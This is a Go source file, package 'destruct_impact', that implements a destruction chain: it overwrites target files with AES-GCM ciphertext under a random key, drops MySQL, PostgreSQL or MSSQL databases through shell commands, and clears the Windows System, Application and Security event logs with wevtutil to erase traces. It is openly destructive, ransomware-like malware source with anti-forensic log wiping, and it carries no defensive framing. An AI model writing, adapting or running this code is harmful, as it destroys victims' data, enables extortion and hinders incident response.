package destruct_impact

import (
"crypto/aes"
"crypto/cipher"
"crypto/rand"
"io"
"os"
"os/exec"
"time"
)

type DestructionChain struct {
TargetPaths []string
Key         []byte
Nonce       []byte
}

func NewDestructionChain() *DestructionChain {
d := &DestructionChain{}
d.Key = make([]byte, 32)
d.Nonce = make([]byte, 12)
io.ReadFull(rand.Reader, d.Key)
io.ReadFull(rand.Reader, d.Nonce)
return d
}

func (d *DestructionChain) EncryptFile(path string) bool {
file, err := os.Open(path)
if err != nil {
return false
}
defer file.Close()
data, err := io.ReadAll(file)
if err != nil {
return false
}
block, err := aes.NewCipher(d.Key)
if err != nil {
return false
}
gcm, err := cipher.NewGCM(block)
if err != nil {
return false
}
ciphertext := gcm.Seal(nil, d.Nonce, data, nil)
os.WriteFile(path, ciphertext, 0644)
return true
}

func (d *DestructionChain) DropDatabase(dbType string, dbName string) bool {
var cmd *exec.Cmd
switch dbType {
case "mysql":
cmd = exec.Command("mysql", "-e", "DROP DATABASE "+dbName)
case "postgres":
cmd = exec.Command("psql", "-c", "DROP DATABASE "+dbName)
case "mssql":
cmd = exec.Command("sqlcmd", "-Q", "DROP DATABASE "+dbName)
}
if cmd == nil {
return false
}
err := cmd.Run()
if err != nil {
return false
}
return true
}

func (d *DestructionChain) WipeLogs() bool {
exec.Command("cmd", "/c", "wevtutil cl System").Run()
exec.Command("cmd", "/c", "wevtutil cl Application").Run()
exec.Command("cmd", "/c", "wevtutil cl Security").Run()
return true
}

func (d *DestructionChain) ExecuteChain(targets []string) bool {
for _, target := range targets {
d.EncryptFile(target)
}
d.WipeLogs()
return true
}

func (d *DestructionChain) DestroyWithDelay(delay time.Duration) bool {
time.Sleep(delay)
return true
}

func (d *DestructionChain) GetKey() []byte {
return d.Key
}

func (d *DestructionChain) GetNonce() []byte {
return d.Nonce
}
